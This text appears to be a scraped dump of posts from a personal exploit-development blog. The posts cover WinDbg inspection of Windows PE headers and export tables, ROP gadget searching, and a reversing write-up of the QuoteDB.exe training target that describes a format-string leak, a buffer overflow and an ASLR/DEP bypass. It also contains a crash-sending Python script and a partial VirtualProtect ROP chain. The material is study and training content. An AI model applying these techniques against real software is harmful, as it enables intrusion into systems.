Remember that the NamesOfFunction RVA is 001ec8a8 found earlier.\n0:003\u0026gt; dd (KERNELBASE+001ec8a8) 7566c8a8 001ef625 001ef631 001ef64b 001ef65d 7566c8b8 001ef67d 001ef699 001ef6cb 001ef6f5 7566c8c8 001ef72e 001ef761 001ef772 001ef781 7566c8d8 001ef795 001ef7ab 001ef7c5 001ef7d8 7566c8e8 001ef7ed 001ef806 001ef80d 001ef81f 7566c8f8 001ef833 001ef84b 001ef85c 001ef86d 7566c908 001ef890 001ef8a0 001ef8b3 001ef8c3 7566c918 001ef8da 001ef8e7 001ef8ff 001ef91a 0:003\u0026gt; da kernelbase+001ef64b 7566f64b \u0026#34;AccessCheckByType\u0026#34; Find the index number in AddressOfNameOrdinals #To find that we know the RVA for AddressOfNameOrdinals is 001ee688 found earlier, with kernelbase base address we know the VMA and dump the values.\nSomething to notice is that this structure is 2 bytes and not 4 bytes, the first position value is 0007, the second value is 0006 and so on due to how CPU architecture presents data to memory (little endian) the highest order is presented in memory, network we know uses big endian.\nAs seen above the symbol \u0026ldquo;AccessCheckByType\u0026rdquo; is the third position in NamesOfFunction, we need to find the third position value in AddressofNameOrdinals. The index value is 0009, now we can go to next step to find that in AddressOfFunctions\n0:003\u0026gt; dd kernelbase+001ee688 7566e688 00070006 00090008 000b000a 000d000c 7566e698 000f000e 00110010 00130012 00150014 7566e6a8 00170016 00190018 001b001a 001d001c 7566e6b8 001f001e 00210020 00230022 00250024 7566e6c8 00270026 00290028 002b002a 002d002c 7566e6d8 002f002e 00310030 00330032 00350034 7566e6e8 00370036 00390038 003b003a 003d003c 7566e6f8 003f003e 00410040 00430042 00450044 Looking for desired function RVA in AddressOfFunctions #The RVA for AddressofFunctions discovered earlier is 001eaac8, we can dump the RVA of the functions. The index position we are interested is 0x9 (discovered earlier). Here is the RVA (0x00148b50) of function address for AccessCheckByType symbol.\n0:003\u0026gt; dd kernelbase+001eaac8 7566aac8 001c4b60 00130260 00100ff0 001ef5dd 7566aad8 001601b0 0014c6f0 0010f650 0014f380 7566aae8 00148b50 001d8cf0 001d8da0 001d8e10 7566aaf8 001d8ed0 001ef70d 001ef743 0015ffb0 7566ab08 0014eba0 0014ff70 001566b0 001d8f90 7566ab18 00161920 001d8fe0 001d9030 00150c10 7566ab28 001d9080 001d90c0 001d9110 001d55a0 7566ab38 001d56d0 00174eb0 001678a0 001c60c0 Resolving RVA of AccessCheckByType #We can see that we successfully resolved the function address for AccessCheckByType symbol in kernelbase module. Just combining the RVA of AccessCheckByType with Base Address of KernelBase. The u command resolves the address displaying the symbol along with the assembly instructions.\n0:003\u0026gt; u kernelbase+0x00148b50 KERNELBASE!AccessCheckByType: 755c8b50 8bff mov edi,edi 755c8b52 55 push ebp 755c8b53 8bec mov ebp,esp 755c8b55 51 push ecx 755c8b56 8d45fc lea eax,[ebp-4] 755c8b59 50 push eax 755c8b5a ff752c push dword ptr [ebp+2Ch] 755c8b5d ff7528 push dword ptr [ebp+28h] ","date":"7 July 2024","permalink":"/posts/postsec/windowspeaddressofnames/","section":"Posts","summary":"A quick step by step tutorial to resolve function address through important fields in IMAGE EXPORT DIRECTORY.","title":"Windows PE NumberofNames, AddressOfNames,AddressOfFunctions \u0026 AddressOfNameOrdinals (windbg)"},{"content":"Steps to inspect IMAGE DATA DIRECTORY (EXPORT Directory TABLE) structure using windbg debugger. Before we need to find the value of e_elfanew (0x3c) and offset to IMAGE OPTIONAL HEADERS (0x18). You can check the previous post Windows PE File structure (windbg It give access to the IMAGE NT HEADERS. If you want to know more about AddressOfNames and NumberofNames\nIMAGE OPTIONAL HEADER #Here we can dump the IMAGE OPTIONAL HEADER at offset 0x18. Here the field _IMAGE_DATA_DIRECTORY.\n0:003\u0026gt; dt ntdll!_IMAGE_OPTIONAL_HEADER 756f0000 + 0xe8 + 0x18 +0x000 Magic : 0x10b +0x002 MajorLinkerVersion : 0xe \u0026#39;\u0026#39; +0x003 MinorLinkerVersion : 0x14 \u0026#39;\u0026#39; +0x004 SizeOfCode : 0x86000 +0x008 SizeOfInitializedData : 0x13000 +0x00c SizeOfUninitializedData : 0 +0x010 AddressOfEntryPoint : 0x1cfa0 +0x014 BaseOfCode : 0x1000 +0x018 BaseOfData : 0x87000 +0x01c ImageBase : 0x756f0000 +0x020 SectionAlignment : 0x1000 +0x024 FileAlignment : 0x1000 +0x028 MajorOperatingSystemVersion : 0xa +0x02a MinorOperatingSystemVersion : 0 +0x02c MajorImageVersion : 0xa +0x02e MinorImageVersion : 0 +0x030 MajorSubsystemVersion : 0xa +0x032 MinorSubsystemVersion : 0 +0x034 Win32VersionValue : 0 +0x038 SizeOfImage : 0x9a000 +0x03c SizeOfHeaders : 0x1000 +0x040 CheckSum : 0xa9760 +0x044 Subsystem : 3 +0x046 DllCharacteristics : 0x4140 +0x048 SizeOfStackReserve : 0x40000 +0x04c SizeOfStackCommit : 0x1000 +0x050 SizeOfHeapReserve : 0x100000 +0x054 SizeOfHeapCommit : 0x1000 +0x058 LoaderFlags : 0 +0x05c NumberOfRvaAndSizes : 0x10 +0x060 DataDirectory : [16] _IMAGE_DATA_DIRECTORY IMAGE DATA DIRECTORY #We see above the Data Directory is at offset 0x60, we can sum the offsect of optional header 0x18. ? 0x60 + 0x18 -\u0026gt; 0x78. The RVA is 0x788b0. We can check Address of Export Directory Table with following command: !dh -f kernel32\n0:003\u0026gt; dt ntdll!_IMAGE_DATA_DIRECTORY 756f0000 + 0xe8 + 0x78 +0x000 VirtualAddress : 0x788b0 +0x004 Size : 0xdc44 VMA OF EXPORT DIRECTORY TABLE #The VMA (Virtual Memory Address) is 0x757688b0\n0:003\u0026gt; ? 756f0000 + 0x788b0 Evaluate expression: 1970702512 = 757688b0 ","date":"5 July 2024","permalink":"/posts/postsec/pe_data_directory/","section":"Posts","summary":"Steps to inspect IMAGE DATA DIRECTORY (EXPORT Directory TABLE) structure using windbg debugger.","title":"Windows PE Export Directory Table (windbg)"},{"content":"Step by step how to inspect the PE structure files using windbg debugger. The most import field is e_elfanew at offset 0x3c. It give access to the IMAGE NT HEADERS. If you want to know how to extract Export Directory Table or AddressOfNames and NumberofNames\nBASE ADDRESS OF KERNEL32 #0:003\u0026gt; lm m kernel32 Browse full module list start end module name 756f0000 7578a000 KERNEL32 (pdb symbols) c:\\symbols\\kernel32.pdb\\6BD7A18B40AE3CF0058AFBC34E25A4371\\kernel32.pdb IMAGE DOS HEADER # 0:003\u0026gt; dt ntdll!_IMAGE_DOS_HEADER 756f0000 +0x000 e_magic : 0x5a4d +0x002 e_cblp : 0x90 +0x004 e_cp : 3 +0x006 e_crlc : 0 +0x008 e_cparhdr : 4 +0x00a e_minalloc : 0 +0x00c e_maxalloc : 0xffff +0x00e e_ss : 0 +0x010 e_sp : 0xb8 +0x012 e_csum : 0 +0x014 e_ip : 0 +0x016 e_cs : 0 +0x018 e_lfarlc : 0x40 +0x01a e_ovno : 0 +0x01c e_res : [4] 0 +0x024 e_oemid : 0 +0x026 e_oeminfo : 0 +0x028 e_res2 : [10] 0 +0x03c e_lfanew : 0n232 IMAGE NT HEADERS #We convert e_lfanew offset to hexadecimal, ?0n232 -\u0026gt; 0xe8.\n0:003\u0026gt; dt ntdll!_IMAGE_NT_HEADERS 756f0000 + 0xe8 +0x000 Signature : 0x4550 +0x004 FileHeader : _IMAGE_FILE_HEADER +0x018 OptionalHeader : _IMAGE_OPTIONAL_HEADER IMAGE OPTIONAL HEADER #Here we can dump the IMAGE OPTIONAL HEADER at offset 0x18. Here we see important fields like AddressOfEntryPoint, DllCharacteristics and DataDirectory\n0:003\u0026gt; dt ntdll!_IMAGE_OPTIONAL_HEADER 756f0000 + 0xe8 + 0x18 +0x000 Magic : 0x10b +0x002 MajorLinkerVersion : 0xe \u0026#39;\u0026#39; +0x003 MinorLinkerVersion : 0x14 \u0026#39;\u0026#39; +0x004 SizeOfCode : 0x86000 +0x008 SizeOfInitializedData : 0x13000 +0x00c SizeOfUninitializedData : 0 +0x010 AddressOfEntryPoint : 0x1cfa0 +0x014 BaseOfCode : 0x1000 +0x018 BaseOfData : 0x87000 +0x01c ImageBase : 0x756f0000 +0x020 SectionAlignment : 0x1000 +0x024 FileAlignment : 0x1000 +0x028 MajorOperatingSystemVersion : 0xa +0x02a MinorOperatingSystemVersion : 0 +0x02c MajorImageVersion : 0xa +0x02e MinorImageVersion : 0 +0x030 MajorSubsystemVersion : 0xa +0x032 MinorSubsystemVersion : 0 +0x034 Win32VersionValue : 0 +0x038 SizeOfImage : 0x9a000 +0x03c SizeOfHeaders : 0x1000 +0x040 CheckSum : 0xa9760 +0x044 Subsystem : 3 +0x046 DllCharacteristics : 0x4140 +0x048 SizeOfStackReserve : 0x40000 +0x04c SizeOfStackCommit : 0x1000 +0x050 SizeOfHeapReserve : 0x100000 +0x054 SizeOfHeapCommit : 0x1000 +0x058 LoaderFlags : 0 +0x05c NumberOfRvaAndSizes : 0x10 +0x060 DataDirectory : [16] _IMAGE_DATA_DIRECTORY ","date":"5 July 2024","permalink":"/posts/postsec/pe_file_structure/","section":"Posts","summary":"Step by step how to inspect the PE structure files using windbg debugger.","title":"Windows PE File structure (windbg)"},{"content":"","date":null,"permalink":"/tags/powershell/","section":"Tags","summary":"","title":"Powershell"},{"content":"During my exploit developement training I observed through a few POC I developed to bypass DEP that some assembly instructions are used quite often during DEP bypass, I decided to create powershell to automate the search.\nThe script by no mean is a replacement of manual search, its just to optmize and provide a more focus approach with meaninful Gadgets when building the ROPs to defeat DEP.\nYou can download the script here on my Github PowerShell ROP Searcher\nHow to use ? # You need to have the rp++ binary full path specified in the script like, on line 29.\n$rpbinpath = \u0026#34;C:\\rp++\\rp-win-x86.exe\u0026#34; You just run the script as follow specificing the module with -dllfile parameter and the filename for the results for -ropfile parameter.\n.\\Get-RopGadgets.ps1 -dllfile .\\msvcrt.dll -ropfile results.txt ","date":"30 June 2024","permalink":"/posts/postsec/powershelll_rop_searcher/","section":"Posts","summary":"During my exploit developement training I observed through a few POC I developed to bypass DEP that some assembly instructions are used quite often during DEP bypass, I decided to create powershell to automate the search.","title":"Powershell ROP Searcher wrapper rp++"},{"content":"Python script I created that facilicates when pushing string onto stack ðŸ˜„.\nYou can download the script here on my Github Gen-Ascii.py Script\nHow to use ? #python .\\Gen-Ascii.py cmd.exe 0x657865 0x2e646d63 ","date":"22 June 2024","permalink":"/posts/postsec/shellcode_put_string_stack/","section":"Posts","summary":"Python script I created that facilicates when pushing string onto stack ðŸ˜„.","title":"Python Script Generate ASCII String to push into Stack"},{"content":"Below the steps to find if the module has any mitigation enabled such as SafeSEH, ASLR or NXCompat. If DllCharacteristics is set to 0, that means no mitigations is enabled.\nFind module base address #0:001\u0026gt; lm m PowerManagementCtrl Browse full module list start end module name 02240000 02269000 PowerManagementCtrl (deferred) We need to find the IMAGE DOS HEADER #0:001\u0026gt; dt ntdll!_IMAGE_DOS_HEADER 02240000 +0x000 e_magic : 0x5a4d +0x002 e_cblp : 0x90 +0x004 e_cp : 3 +0x006 e_crlc : 0 +0x008 e_cparhdr : 4 +0x00a e_minalloc : 0 +0x00c e_maxalloc : 0xffff +0x00e e_ss : 0 +0x010 e_sp : 0xb8 +0x012 e_csum : 0 +0x014 e_ip : 0 +0x016 e_cs : 0 +0x018 e_lfarlc : 0x40 +0x01a e_ovno : 0 +0x01c e_res : [4] 0 +0x024 e_oemid : 0 +0x026 e_oeminfo : 0 +0x028 e_res2 : [10] 0 +0x03c e_lfanew : 0n232 Now the e_ifanew is at offset 0x03c and contains the offset to our PE Header at 0n232. We need to convert to hexadecimal 0n232 to hex value, you can run ?0n232\nConvert PE Header to hexadecimal #0:001\u0026gt; ?0n232 Evaluate expression: 232 = 000000e8 Dump IMAGE NT HEADER #Now we need to dump the IMAGE NT HEADER at offset 0xe0\n0:001\u0026gt; dt ntdll!_IMAGE_NT_HEADERS 02240000 + 0xe8 +0x000 Signature : 0x4550 +0x004 FileHeader : _IMAGE_FILE_HEADER +0x018 OptionalHeader : _IMAGE_OPTIONAL_HEADER Dump OPTIONAL HEADER #Next step is to dump IMAGE OPTIONAL HEADER at offset 0x18. There we go at offset 0x46 from OPTIONAL HEADER and we see the DllCharacteristics is 0 meaning there is no SafeSEH, ASLR or NXCompat compiled on this module. We can also do the same using ProcessHacker (automated by the program)\n0:001\u0026gt; dt ntdll!_IMAGE_OPTIONAL_HEADER 02240000 + 0xe8 + 0x18 +0x000 Magic : 0x10b +0x002 MajorLinkerVersion : 0x6 \u0026#39;\u0026#39; +0x003 MinorLinkerVersion : 0 \u0026#39;\u0026#39; +0x004 SizeOfCode : 0x14000 +0x008 SizeOfInitializedData : 0x14000 +0x00c SizeOfUninitializedData : 0 +0x010 AddressOfEntryPoint : 0x3632 +0x014 BaseOfCode : 0x1000 +0x018 BaseOfData : 0x15000 +0x01c ImageBase : 0x10000000 +0x020 SectionAlignment : 0x1000 +0x024 FileAlignment : 0x1000 +0x028 MajorOperatingSystemVersion : 4 +0x02a MinorOperatingSystemVersion : 0 +0x02c MajorImageVersion : 0 +0x02e MinorImageVersion : 0 +0x030 MajorSubsystemVersion : 4 +0x032 MinorSubsystemVersion : 0 +0x034 Win32VersionValue : 0 +0x038 SizeOfImage : 0x29000 +0x03c SizeOfHeaders : 0x1000 +0x040 CheckSum : 0 +0x044 Subsystem : 2 +0x046 DllCharacteristics : 0 +0x048 SizeOfStackReserve : 0x100000 +0x04c SizeOfStackCommit : 0x1000 +0x050 SizeOfHeapReserve : 0x100000 +0x054 SizeOfHeapCommit : 0x1000 +0x058 LoaderFlags : 0 +0x05c NumberOfRvaAndSizes : 0x10 +0x060 DataDirectory : [16] _IMAGE_DATA_DIRECTORY ","date":"15 June 2024","permalink":"/posts/postsec/windbg_dllcharacteristics/","section":"Posts","summary":"Below the steps to find if the module has any mitigation enabled such as SafeSEH, ASLR or NXCompat.","title":"Check DllCharacteristics values with Windbg"},{"content":"Win32 Apis that could result in information leak useful to investigate during exploit development. If you are reviewing the TCP protocol, you need to find the function that will actually send the data back to you, most the time using the send function.\nDebugHelp (Dbghelp.dll) ToolHelp32Snapshot (kernel32.dll) EnumProcessModules (kernel32.dll or Psapi.dll) fopen (stdio.h) printf (stdio.h) // Useful if vulnerable to format string vulnerability Fun with Info-Leaks #Good article Fun With Info-Leaks\nGood Resource #A github I found with lots of great information about exploit development Great Resource\n","date":"15 June 2024","permalink":"/posts/postsec/win32_infoleak_expdev/","section":"Posts","summary":"Win32 Apis that could result in information leak useful to investigate during exploit development.","title":"Info Leak using Win32 Apis for Exploit Dev"},{"content":"A few years ago I decided to use powershell more and more instead of tasking most of my work in python. The problem with python if you are using windows, you have to install the python interpreter and with powershell it comes out of the box.\nWhen developing ROP Gadgets, I like to use powershell to look for what I need.\nThe Get-Content read a file, the shortcut command is gc, you can pipe to select-string which will search for your desirable pattern along with the -AllMatches parameter. The select-string supports Regex out of the box.\nExample 1 #Get-Content .\\file.txt | Select-String \u0026#34;.*sub esp.*ret\u0026#34; -AllMatches The second example we will look for \u0026ldquo;add esp, 0x*****\u0026rdquo; Gadgets that contains numbers 5 to 10, we for loop through and search for it.\nExample 2 #5..10 | % { Get-Content .\\PowerManagementCtrl_Rop.txt | Select-String \u0026#34;.*add esp, 0x.*$_.*ret\u0026#34; -AllMatches } There are two powershell books that changed my life and I recommend buying, if you are interested\nBooks # Learn PowerShell in a Month of Lunches, Fourth Edition: Covers Windows, Linux, and macOS PowerShell Cookbook: Your Complete Guide to Scripting the Ubiquitous Object-Based Shell ","date":"14 June 2024","permalink":"/posts/postsec/searching_assembly_gagets_powershell/","section":"Posts","summary":"A few years ago I decided to use powershell more and more instead of tasking most of my work in python.","title":"Searching for ROP Gadgets with powershelll"},{"content":"By Browsing the internet I found a really good github with plentful resources to study ðŸ˜„\nThanks to Ondrik8 to put all these knowledge together as I am interested on Malware Development and Kernel Exploits.\nGithub Ondrik8 Blog Ondrik8\n","date":"13 June 2024","permalink":"/posts/postsec/goodstuff_offensiveknowledge/","section":"Posts","summary":"By Browsing the internet I found a really good github with plentful resources to study ðŸ˜„","title":"Good Stuff Offensive Security Resources"},{"content":"","date":null,"permalink":"/tags/redteam/","section":"Tags","summary":"","title":"RedTeam"},{"content":"","date":null,"permalink":"/tags/windowsinternal/","section":"Tags","summary":"","title":"WindowsInternal"},{"content":"I\u0026rsquo;m continuing to study for my OSED Exam, I downloaded the quotedb.exe developed by bmdyy. You can download here QuoteDB.exe\nWe will use windbg and IDA Free to uncover vulnerabilities and exploit, the QuoteDB.exe has been compiled with ASLR and DEP enabled. If you haven\u0026rsquo;t seen, please check my post about DEP: Demystifying DEP (Data Execution Prevention). We will also bypass ASLR by leaking the address returned to us, lets start and stop talking ðŸ‘½.\nEnumerating the Software #One step really important is software enumeration, we will run the application and observe all available functionality that receives input either from user or application itself through its configuration files, registry keys etc. One of the tool commonly used for software enumeration is sysinternal from Microsoft where we can observe port listening, what files or registry keys the software is trying to access etc.\nAfter you download the QuoteDB.exe, lets run and observe the software running using TCPView one of the sysinternal tools.\nJust observing the output we can learn a lot, the software adds some data to db and we don\u0026rsquo;t know yet if its writing the data to a file or memory at this point, know they call it as \u0026ldquo;quote\u0026rdquo; and the software initializes the WSA and network Socket and bound to 3700 TCP port. Using TCPView we can confirm is indeed listeninig on port 3700 TCP Protocol.\nASLR and DEP Enabled #We can use the narly plugin to check binary protections enabled on quotedb.exe. We can use windbg to attach to quotedb.exe process and run the command below to load the plugin.\n.load narly.dll We can run !nmod to check protections and we see *ASLR and *DEP are enabled on QuoteDB process. That means we will need to bypass the protections to be successful.\n0:001\u0026gt; !nmod 01000000 01052000 QuoteDB /SafeSEH OFF *ASLR *DEP C:\\Users\\kali\\Desktop\\ExpDev_Traning\\QuoteDB.exe 747c0000 74816000 mswsock /SafeSEH ON /GS *ASLR *DEP C:\\Windows\\system32\\mswsock.dll 75290000 754c8000 KERNELBASE /SafeSEH ON /GS *ASLR *DEP C:\\Windows\\System32\\KERNELBASE.dll 76ac0000 76b23000 WS2_32 /SafeSEH ON /GS *ASLR *DEP C:\\Windows\\System32\\WS2_32.dll 76b30000 76bf3000 RPCRT4 /SafeSEH ON /GS *ASLR *DEP C:\\Windows\\System32\\RPCRT4.dll 76e00000 76ebf000 msvcrt /SafeSEH ON /GS *ASLR *DEP C:\\Windows\\System32\\msvcrt.dll 76f50000 76fea000 KERNEL32 /SafeSEH ON /GS *ASLR *DEP C:\\Windows\\System32\\KERNEL32.DLL 77060000 771ff000 ntdll /SafeSEH ON /GS *ASLR *DEP C:\\Windows\\SYSTEM32\\ntdll.dll *DEP/*ASLR means that these modules are compatible with ASLR/DEP Reverse Engineering QuoteDB.exe #After we have discovered the software is listening on 3700 port, we can use static and dynamic tools to understand more about the QuoteDB.exe.\nFor static anlysis we will use IDA Free and windbg for dynamic analysis. Lets decompile QuoteDB.exe with IDA Free and Sync with Windbg. Open the quotedb.exe on IDA Free and also open windbg and attach to the running quotedb.exe process. After you attach with windbg to QuoteDB.exe you should see similar information, on your machine might change the memory address, you need to make sure the base address for QuoteDB.exe is matched with the one in IDA Free, you can see in windbg shows QuoteDB.exe base address is 0x01000000.\nSymbol search path is: srv*c:\\symbols*https://msdl.microsoft.com/download/symbols Executable search path is: ModLoad: 01000000 01052000 C:\\Users\\kali\\Desktop\\ExpDev_Traning\\QuoteDB.exe ModLoad: 77060000 771ff000 C:\\Windows\\SYSTEM32\\ntdll.dll ModLoad: 76f50000 76fea000 C:\\Windows\\System32\\KERNEL32.DLL ModLoad: 75290000 754c8000 C:\\Windows\\System32\\KERNELBASE.dll ModLoad: 76e00000 76ebf000 C:\\Windows\\System32\\msvcrt.dll ModLoad: 76ac0000 76b23000 C:\\Windows\\System32\\WS2_32.dll ModLoad: 76b30000 76bf3000 C:\\Windows\\System32\\RPCRT4.dll ModLoad: 747c0000 74816000 C:\\Windows\\system32\\mswsock.dll (19b0.26e0): Break instruction exception - code 80000003 (first chance) eax=012c2000 ebx=00000000 ecx=7712b430 edx=7712b430 esi=7712b430 edi=7712b430 eip=770f2770 esp=017ff7f8 ebp=017ff824 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 ntdll!DbgBreakPoint: 770f2770 cc int 3 Now we need to check in IDA Free, please go to \u0026ldquo;Edit -\u0026gt; Segments -\u0026gt; Rebase Program\u0026hellip;\u0026rdquo; and if \u0026ldquo;Image Base\u0026rdquo; doesn\u0026rsquo;t match with 0x01000000 (yours might be different), you need to update and click on Ok Button.\nHooking Windbg to WS2_32!recv #To be able to understand better the software we need to hook the software to the function that will receive the data on port 3700. How to find what function the software is using to receive the data? you can look in the IAT using IDA and see the networking function, most of the time the software will use the recv function from kernel32 or WS2_32 module, you have to determine. In our case if you look at IMPORTS tab in IDA Free and search for recv funtion, we can see its using the WS2_32 module.\nWe just need to set a breakpoint on WS2_32!recv in windbg as showing below with bp command, the bp set a breakpoint, type g and hit enter to let the debugger continue the execution.\nSending a dummy packet #Next step write a small python script to send a dummy data allowing us to analyse the software flow using IDA Free and Windbg to follow along. Below is a PoC python script I created.\nYou can run the script as:\npython.exe poc-quote.py \u0026lt;IP\u0026gt; import socket import sys def main(): if len(sys.argv) != 2: print(\u0026#34;Usage: %s \u0026lt;ip_address\u0026gt;\\n\u0026#34; % (sys.argv[0])) sys.exit(1) server = sys.argv[1] port = 3700 buf = bytearray([0x41]*0x1000) s = socket.socket() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((server,port)) s.send(buf) resp = s.recv(1024) print(\u0026#34;Response: \u0026#34;,resp) print(\u0026#34;[+] Packet Crash Sent\u0026#34;) sys.exit(0) if __name__ == \u0026#39;__main__\u0026#39;: main() We can see the breakpoint is hit, and the memory address will contain our buffer at 017fbb34. We can set a read hardware breakpoint to see where our payload will be used, you can see that out payload is been stored in eax and will be saved in ebp-4034h.\n0:001\u0026gt; bp WS2_32!recv 0:001\u0026gt; g Breakpoint 0 hit eax=000000c0 ebx=01ab0f78 ecx=00000000 edx=017fbb34 esi=0100173b edi=76e66bc0 eip=76ad23a0 esp=017f7308 ebp=017ffb64 iopl=0 nv up ei pl nz ac po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212 WS2_32!recv: 76ad23a0 8bff mov edi,edi 0:001\u0026gt; dds esp l6 017f7308 01001790 QuoteDB+0x1790 017f730c 000000c0 017f7310 017fbb34 017f7314 00004000 017f7318 00000000 017f731c 00000000 0:001\u0026gt; ba r1 017fbb34 0:001\u0026gt; g Breakpoint 1 hit eax=41414141 ebx=01ab0f78 ecx=1ff2004a edx=00000000 esi=0100173b edi=76e66bc0 eip=010017e8 esp=017f730c ebp=017ffb64 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 QuoteDB+0x17e8: 010017e8 8985ccbfffff mov dword ptr [ebp-4034h],eax ss:0023:017fbb30=00000000 Analysing the code block in IDA #Now we can copy the memory address 0x010017e8 and search in IDA Free to understand the code block. You can use \u0026ldquo;g\u0026rdquo; keyboard key to jump to address using a memory address\nI like to add comments to the assembly instructions that I have control. The following are important instructions to understand:\n0x0100180D - Maximum buffer size is 0x4000 bytes that means we can send a maximum 0x4000 bytes for our payload. 0x010017E2 - eax will contain our controlled buffer 0x010017E8 - eax will copy first 4 bytes of our payload in ebp+var_4034 0x01001847 - our payload ebp+var_4034 will be copied again into eax 0x0100184D - eax (our 4 bytes payload) will be substracted by 0x384 bytes 0x01001852 - eax will be compared with 4 if eax \u0026lt;= 4, won\u0026rsquo;t take the jump only if \u0026gt; 4. We can learn that first 4 bytes is substracted by 0x384 and compared with 4, this block is a switch statement and based on the opcode number we provide that will take us to jump to different code blocks.\nadd_quote function #After spending some time reverse engineering you will notice the 902 (0x386) opcode will take us to the add_quote function. The function will add data of 0x800 bytes into memory address.\nget_quote function #Next we see there is a function called get_quote and the opcode is 901 (0x385), the get_quote has two arguments the index that will be used to retrieve the data and the buffer memory address to write it back into a different memory address.\nget_quote snprintf vulnerablity #If we analyse the get_quote function in IDA, we will se the _snprintf function is vulnerable to format string attack. By sending the payload with %x we can leak a memory address in the stack, and its sent to us via networking packet, and that\u0026rsquo;s handy because the quotedb.exe is compiled with ASLR enabled, this will allow us to bypass ASLR.\nbuffer overflow #If we feed the program with an invalid opcode, the program will call the _log_bad_request function, this function is vulnerbale to buffer overflow if we send a large enough buffer. We can observe below that the issue is the memset function allocates only 0x800 and memcpy maximum size is 0x4000, if we send larger buffer bigger than 0x800 bytes, we can overflow the buffer.\nSteps to Develop the Exploit #Now that we understood the major functions like add_quote, get_quote and how to trigger the vulnerability, we need to develop an exploit that will bypass ASLR and DEP. I already wrote a working PoC that you can follow, you can check quotedb POC\nSend a packet to trigger add_quote via opcode 902 (0x386) Send a second packet to trigger the get_quote via opcode 901 (0x385) to leak a module to bypass ASLR send another packet to trigger buffer overflow with an invalid opcode and large buffer to overflow. We developed ROP (Returned Oriented Programming) to bypass DEP and execute our shellcode. I hope you enjoy and see you on next post ðŸ˜„\n","date":"7 June 2024","permalink":"/posts/postsec/quotedb_reverseenginering/","section":"Posts","summary":"I\u0026rsquo;m continuing to study for my OSED Exam, I downloaded the quotedb.","title":"Reversing Engineering quotedb.exe (bmdyy) Bypass ASLR+DEP"},{"content":"We all (cybersecurity space) heard about DEP, some might don\u0026rsquo;t know and want to understand how it works and what its purpose. This post is specially for new people or non-technical people that want to understand DEP.\nWhy DEP was created ? #DEP stands for Data Execution Prevention and was created in a response to exploits that used to execute code on the stack or heap. DEP marks these memory regions as non-executable which causes the exploits to fail.\nROP (Return Oriented Programming) Technique #In a response to DEP, ROP technique was created allowing to bypass DEP protection by re-using executable code that is already present in the application\u0026rsquo;s memory, by combining the pieces of re-usable code is possible to executable arbritary code in memory by calling Win32 Apis and executing shellcode, the pieces of code is often called by security researchers as ROP Gadgets.\nUnderstanding x86 #We need to understand each major registers in x86 architecture, the CPU utilizes a set of registers for performing operations. registers are small, fast storage locations within the CPI and its used to hold data temporarily during computation.\nGeneral-Purpose Register #It\u0026rsquo;s important to understand the purpose of each register because when working on building the ROP Gagets, choosing the ROP Gagets combination will become easier.\nEAX (Accumulator Register) #Primarily used for arithmetic and data manipulation operations. It can also be used for I/O port access. Specific Uses: Often used to hold the results of arithmetic operations like addition, subtraction, and multiplication.\nEBX (Base Register) #Used as a base pointer for memory access, especially in older addressing modes. Specific Uses: Holds the base address of data in memory. Can be used as a general-purpose register in modern contexts.\nECX (Counter Register) #Primarily used as a loop counter. Specific Uses: Used in loop and string operations, where it typically holds the count for loop iterations or the length of a string.\nEDX (Data Register) #Used for I/O operations and multiplication/division operations. Specific Uses: Often used to hold the high-order word in multiplication and division operations, as well as for I/O port addresses.\nESI (Source Index) #Used as a pointer for source data in string operations. Specific Uses: Points to the source in memory for operations like movsb, movsw, movsd (string move instructions).\nEDI (Destination Index) #Used as a pointer for destination data in string operations. Specific Uses: Points to the destination in memory for operations like movsb, movsw, movsd.\nEBP (Base Pointer) #Purpose: Used to point to the base of the stack frame. Specific Uses: Helps in stack frame referencing for local variables and function parameters.\nESP (Stack Pointer) #Points to the top of the current stack. Specific Uses: Keeps track of the call stack, managing function call and return addresses.\nApplying what we know about ROP (Return Oriented Programming) #As mentioned above ROP is re-usable executable code to perform arbitrary execution code in memory, how that works ? below is an example of ROP Gagets.\nThe small piece of ROP Gagets below retrieves the memory address for kernel32!VirtualProtect function, VirtualProtect.\nWhat all of them have in common ? they all end with a \u0026ldquo;ret\u0026rdquo; assembly instruction, in assembly the ret instruction will execute the code instruction on top of the stack. To build a ROP Gaget the instruction must end with a \u0026ldquo;ret\u0026rdquo; after performing the operation the \u0026ldquo;ret\u0026rdquo; will execute the next instruction just a like chain of instructions. The first instruction 0x100fcba2 (pop esi ; ret ;) which will store the address hex value: 0x100fcba2 in esi and execute the next rop gaget instruction at 0x100fa8be. The next rop gaget instruction 0x100fa8be (pop ecx ; ret;), we are now storing the 0x10406154 in ecx and the \u0026ldquo;ret\u0026rdquo; instruction will execute the next rop gadget instruction 0x100f864c (and ecx, esi ; pop esi ; mov eax, ecx ; pop ebx ; retn 0x0004), this operation will peform an and operation between value stored in ecx and esi, the result is the memory address of VirtualProtect imported by vulnserver.exe executable.\nThe next rop gaget instruction 0x10187f21 (mov ecx, [ecx] ; mov eax, ecx ; ret ; ) will deference the address stored in ecx and store the value in ecx. We successfully accomplished our goal to retrieve through rop gaget the memory address for kernel32!VirtualProtect function.\nHere you can check the full DEP bypass POC I developed for vulnserver.exe\nNote.: The junk for (reg32) is necessary for each pop instruction if the memory address contains several pop instrunctions without having a push instruction for each pop, you need to address that by accounting with junk values otherwise your next valid gaget will be popped into these register instead of being executed by the ret instruction.\n# ROP CHAIN # Patching VirtualProtect # 0x100fcba2: pop esi ; ret ; (1 found) # 0xf406154: VirtualProtect for and operation # 0x100fa8be: pop ecx ; ret ; # 0x10406154: VirtualProtect for and operation # 0x100f864c: and ecx, esi ; pop esi ; mov eax, ecx ; pop ebx ; retn 0x0004 # 0x42424242: Junk for esi # 0x42424242: junk for ebx # 0x10187f21: mov ecx, [ecx] ; mov eax, ecx ; ret ; # 0x42424242: junk for retn 0x0004 Humble Recommendation #When developing ROP gagets something I learned through experience and understanding well the purpose of each register is that a lot can be accomplished by looking for eax, ecx, esi and esp registers, the ebp,edx,ebx,edi are important as well, but if you look for all available instructions the 4 registers I mentioned you should be able to do a lot and accomplish your goal. Most applications and modules will use these registers excessively allowing us to perform different operation/combinations and facilitating us to achieve our goal.\nAgain, if you have not checked yet, check my DEP bypass POC Here\n","date":"1 June 